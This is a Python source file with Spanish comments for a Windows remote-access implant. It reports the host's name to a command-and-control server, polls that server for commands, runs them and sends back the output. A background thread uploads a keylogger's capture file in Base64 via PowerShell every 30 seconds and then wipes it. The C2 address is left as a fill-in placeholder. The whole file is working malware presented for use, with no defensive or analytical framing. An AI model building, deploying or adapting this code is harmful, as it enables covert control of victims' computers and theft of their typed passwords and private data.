import ctypes
import ctypes.wintypes
import json
import time
import sys
import threading
import os
from reader import start_reader
from command_executor import run_command_get_output

LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID)

@LPTHREAD_START_ROUTINE
def thread_entry_point(lpParam):
    try:
        print("[INFO] start_reader ejecutándose desde un hilo nativo con ctypes")
        start_reader()
    except Exception as e:
        print(f"[ERROR] en start_reader: {e}")
    return 0  # DWORD esperado

# Función para lanzar start_reader como hilo usando CreateThread
def launch_reader_thread():
    print("[INFO] Lanzando hilo con start_reader desde ctypes")
    thread_id = ctypes.wintypes.DWORD(0)
    handle = ctypes.windll.kernel32.CreateThread(
        None, 0, thread_entry_point, None, 0, ctypes.byref(thread_id)
    )
    if not handle:
        raise ctypes.WinError()
    return handle

# --- obtener hostname (Windows) ---
kernel32 = ctypes.windll.kernel32
buffer = ctypes.create_unicode_buffer(256)
size = ctypes.wintypes.DWORD(len(buffer))
success = kernel32.GetComputerNameW(buffer, ctypes.byref(size))
if not success:
    raise RuntimeError("No se pudo obtener el hostname")
hostname = buffer.value


BASE_URL = "http://{tu_ip_C2}/"
STATUS_ENDPOINT = f"{BASE_URL}/status"
COMMANDER_ENDPOINT = f"{BASE_URL}/Comander"
RESPONSES_ENDPOINT = f"{BASE_URL}/Responses"


KEYLOG_PATH = r"C:\Users\Public\Downloads\keyloge.txt"
KEYLOG_UPLOAD_URL = "http://{tu_ip_C2}/uploads"
KEYLOG_INTERVAL_SECS = 30 

try:
    import requests
    HAVE_REQUESTS = True
except Exception:
    HAVE_REQUESTS = False

def send_with_requests(url, fields):
    try:
        r = requests.post(url, files={k: (None, str(v)) for k, v in fields.items()}, timeout=10)
        r.raise_for_status()
        return r.text
    except Exception as e:
        print(f"[ERROR requests POST {url}]: {e}", file=sys.stderr)
        return None

def send_with_curl(url, fields):
    parts = []
    for k, v in fields.items():
        safe_val = str(v).replace("'", "\\'")
        parts.append(f"-F \"{k}='{safe_val}'\"")
    args = " ".join(parts)
    cmd = f'curl.exe -s -X POST {args} "{url}"'
    return run_command_get_output(cmd)

def send_form(url, fields):
    if HAVE_REQUESTS:
        return send_with_requests(url, fields)
    else:
        return send_with_curl(url, fields)

def powershell_escape_single_quotes(s: str) -> str:
    return s.replace("'", "''")


def keylog_uploader_loop(file_path: str, upload_url: str, interval_secs: int):
    """
    Cada 'interval_secs':
      1) Lee file_path como bytes -> Base64 (en PowerShell).
      2) POST JSON {file: "<b64>"} a upload_url con Invoke-WebRequest.
      3) Si StatusCode == 200 y el archivo no estaba vacío, limpia el archivo.
    """
    print(f"[INFO] Iniciando keylog_uploader_loop. Archivo='{file_path}', URL='{upload_url}', intervalo={interval_secs}s")

    # Para evitar enviar repetido si no cambia, recordamos tamaño y mtime
    last_sig = None

    while True:
        try:
            # Si no existe o está vacío, duerme
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                time.sleep(interval_secs)
                continue

            stat = os.stat(file_path)
            sig = (stat.st_size, int(stat.st_mtime))
            if sig == last_sig:
                # no cambió desde el último envío
                time.sleep(interval_secs)
                continue

            # 1) Obtener base64 con PowerShell via run_command_get_output
            ps_path = powershell_escape_single_quotes(file_path)
            b64_cmd = f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{ps_path}'))"
            file_base64 = (run_command_get_output(b64_cmd) or "").strip()

            if not file_base64:
                # Si falló la lectura o quedó vacío, reintenta luego
                time.sleep(interval_secs)
                continue

            # 2) Enviar JSON {file: "<b64>"} y devolver StatusCode
            ps_upload = (
                f"$b64 = '{file_base64}'; "
                "$json = @{ file = $b64 } | ConvertTo-Json -Compress; "
                "$headers = @{ 'Content-Type' = 'application/json' }; "
                f"(Invoke-WebRequest -Uri '{upload_url}' -Method POST -Headers $headers -Body $json -UseBasicParsing).StatusCode"
            )
            status_text = (run_command_get_output(ps_upload) or "").strip()
            # Muchas veces PowerShell devuelve "200" o "200 OK" según versión; toleramos ambos:
            ok = status_text.startswith("200")

            print(f"[INFO] Upload keylog Status='{status_text}'")

            # 3) Si OK, limpiamos el archivo
            if ok:
                clear_cmd = f"Clear-Content -Path '{ps_path}' -ErrorAction SilentlyContinue"
                _ = run_command_get_output(clear_cmd)
                print("[INFO] Keylog limpiado tras upload exitoso.")
                last_sig = None  # tras limpiar, reiniciar firma
            else:
                # No limpiamos si falló
                last_sig = sig

        except Exception as e:
            print(f"[ERROR] keylog_uploader_loop: {e}", file=sys.stderr)

        time.sleep(interval_secs)


def main_loop():
    print(f"[INFO] Enviando hostname '{hostname}' a {STATUS_ENDPOINT}")
    resp = send_form(STATUS_ENDPOINT, {"machine": hostname})
    if resp is None:
        print("[WARN] Falló el envío inicial a /status.", file=sys.stderr)
    else:
        print(f"[INFO] Respuesta /status: {resp}")

    POLL_INTERVAL = 15
    last_command_id = None

    while True:
        try:
            print(f"[INFO] Consultando {COMMANDER_ENDPOINT} (machine={hostname})")
            if HAVE_REQUESTS:
                files = {"machine": (None, hostname)}
                try:
                    r = requests.post(COMMANDER_ENDPOINT, files=files, timeout=10)
                    r.raise_for_status()
                    text = r.text
                except Exception as e:
                    print(f"[ERROR] petición a /Comander fallida: {e}", file=sys.stderr)
                    text = None
            else:
                text = run_command_get_output(f'curl.exe -s -X POST -F "machine={hostname}" "{COMMANDER_ENDPOINT}"')

            if not text:
                time.sleep(POLL_INTERVAL)
                continue

            try:
                j = json.loads(text)
            except Exception as e:
                print(f"[ERROR] JSON inválido recibido de /Comander: {e}. Contenido: {text!r}", file=sys.stderr)
                time.sleep(POLL_INTERVAL)
                continue

            if "command" not in j or not j["command"]:
                time.sleep(POLL_INTERVAL)
                continue

            try:
                ide = j["command"]["id"]
                command = j["command"]["command"]
            except Exception as e:
                print(f"[ERROR] Formato de comando inesperado: {e} - {j}", file=sys.stderr)
                time.sleep(POLL_INTERVAL)
                continue

            if ide == last_command_id:
                print(f"[DEBUG] Comando con id={ide} ya fue ejecutado previamente. Ignorando.")
                time.sleep(POLL_INTERVAL)
                continue

            print(f"[INFO] Ejecutando comando id={ide}: {command!r}")

            try:
                remote_execution = run_command_get_output(command)
                if remote_execution is None:
                    remote_execution = ""
            except Exception as e:
                remote_execution = f"ERROR ejecutando comando: {e}"
                print(f"[ERROR] {e}", file=sys.stderr)

            payload = {
                "machine": hostname,
                "command_id": ide,
                "stdout": remote_execution
            }

            print(f"[INFO] Enviando resultado del comando id={ide} a {RESPONSES_ENDPOINT}")
            send_resp = send_form(RESPONSES_ENDPOINT, payload)
            if send_resp is None:
                print(f"[WARN] Falló el envío de la respuesta para command_id={ide}", file=sys.stderr)
            else:
                print(f"[INFO] Respuesta del servidor al enviar stdout: {send_resp}")

            last_command_id = ide

        except Exception as outer_e:
            print(f"[CRITICAL] Exception en main loop: {outer_e}", file=sys.stderr)

        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    launch_reader_thread()

    # Hilo Python para el uploader del keylog
    t = threading.Thread(
        target=keylog_uploader_loop,
        args=(KEYLOG_PATH, KEYLOG_UPLOAD_URL, KEYLOG_INTERVAL_SECS),
        daemon=True
    )
    t.start()

    main_loop()

